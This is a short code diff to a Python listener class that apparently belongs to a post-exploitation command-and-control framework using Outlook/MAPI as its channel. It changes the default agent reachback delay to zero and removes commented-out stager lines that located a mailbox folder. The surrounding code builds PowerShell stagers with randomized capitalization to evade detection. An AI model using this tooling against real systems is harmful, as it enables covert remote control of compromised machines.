@@ -64,7 +64,7 @@ class Listener:
             'DefaultDelay' : {
                 'Description'   :   'Agent delay/reach back interval (in seconds).',
                 'Required'      :   True,
-                'Value'         :   20
+                'Value'         :   0
             },
             'DefaultJitter' : {
                 'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
@@ -179,12 +179,6 @@ class Listener:
                     stager += "$outlook = New-Object -comobject Outlook.Application;"
                     stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
                     stager += 'MAPI");'
-                    #stager += helpers.randomize_capitalization("$f = $mapi.Folders | select name;")
-                    #stager += helpers.randomize_capitalization("$inf = 0; $cntr=1;")
-
-                #stager += helpers.randomize_capitalization("foreach ($name in $f) { if($name.name -eq '")
-                #stager += listenerOptions['Email']['Value']
-                #stager += helpers.randomize_capitalization("'){ $inf = $cntr; } $cntr += 1 }")
 
                 # clear out all existing mails/messages
 
@@ -255,9 +249,7 @@ class Listener:
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
         folder = listenerOptions['Folder']['Value']
-        #email = listenerOptions['Email']['Value']
-
-
+        
         if language.lower() == 'powershell':
 
             # read in the stager base
